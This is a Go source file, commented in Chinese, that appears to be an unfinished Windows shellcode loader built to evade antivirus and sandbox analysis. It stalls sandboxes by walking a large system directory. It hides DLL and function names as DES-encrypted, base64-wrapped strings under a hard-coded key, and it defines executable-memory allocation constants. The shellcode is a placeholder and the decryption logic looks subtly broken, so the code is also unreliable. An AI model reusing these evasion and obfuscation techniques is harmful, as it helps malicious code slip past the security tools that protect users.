package main

import (
	"io/ioutil"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"runtime"
	//"encoding/hex"
	"syscall"
	//"time"
	//"unsafe"
	"crypto/cipher"
	"crypto/des"
	"encoding/base64"
)
// 当遍历某个目录时,只要那个目录文件够多,沙箱就会被卡死,不会执行之后的代码(沙箱运行时长为120秒,没试过更长)
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func main() {
	// 要遍历的目录
	rootDir := "C:\\Windows\\assembly"
	fileCount := 0

	// 遍历目录下的所有文件和子目录
	err := filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
		// 排除目录本身
		if path != rootDir {
			// 如果是文件，则输出文件名
			if !info.IsDir() {
				fileCount++
				//fmt.Println(info.Name())
			}
		}
				
		return nil
	})
	// 沙箱检测不到后面的代码,但多引擎会检测到
	sb()
	// numberOfCPU1, _ := numberOfCPU()
	// fmt.Println(numberOfCPU1)
	filePath := strconv.Itoa(fileCount)+".txt"
				content:= "Hello, World!"
				

				// 将内容写入文件
				err = ioutil.WriteFile(filePath, []byte(content), 0644)
				if err != nil {
					fmt.Println("error")
				}

	if err != nil {
		fmt.Println(err)
	}
}

func numberOfCPU() (int, error) {
	a := runtime.NumCPU()
	//fmt.Println("CPU核心数为:", a)
	if a < 4 {
		return 0, nil // 小于4核心数,返回0
	} else {
		return 1, nil // 大于4核心数，返回1
	}
}

func sb() {
	var sb1 = decode([]byte("rhx0LytL44WytwV52YDNDkvsOwKrD3Ok"))
	var sb2 = decode([]byte("aZZbERidQmCtA2xs1UoF5Q=="))
	var sb3 = decode([]byte("7FqLot2sAD7nM307dM+z3Syg3aZ/b2hG"))

	var	hh1      = syscall.MustLoadDLL(sb1)
	var	hh2         = syscall.MustLoadDLL(sb2)
	var	hh3  = hh1.MustFindProc(sb3)
	var	hh4 = hh2.MustFindProc(sb3)
	var	code          = "dfdkjsnfkdsnfkds" //16进制字符串代码
	var	decode1       = "sbbbbbbbbbb"
	fmt.Println(hh3)
	fmt.Println(hh4)
	fmt.Println(code)
	fmt.Println(decode1)
}
func decode(encryptedString []byte) (string){
	key := []byte("8bytekey")
	// DES解密
	decryptedString, err := desDecrypt(encryptedString, key)
	if err != nil {
		return ""
	}

	// Base64解码
	base64DecodedString, err := base64.StdEncoding.DecodeString(string(decryptedString))
	if err != nil {
		return ""
	}
	return string(base64DecodedString)
}

func desDecrypt(ciphertext, key []byte) ([]byte, error) {
	block, err := des.NewCipher(key)
	if err != nil {
		return nil, err
	}

	iv := bytesRepeating(8, byte(0))
	decryptedText := make([]byte, len(ciphertext))

	blockMode := cipher.NewCBCDecrypter(block, iv)
	blockMode.CryptBlocks(decryptedText, ciphertext)

	// 去除填充
	padding := decryptedText[len(decryptedText)-1]
	decryptedText = decryptedText[:len(decryptedText)-int(padding)]

	return decryptedText, nil
}

// 生成重复字节的切片
func bytesRepeating(length int, b byte) []byte {
	result := make([]byte, length)
	for i := range result {
		result[i] = b
	}
	return result
}
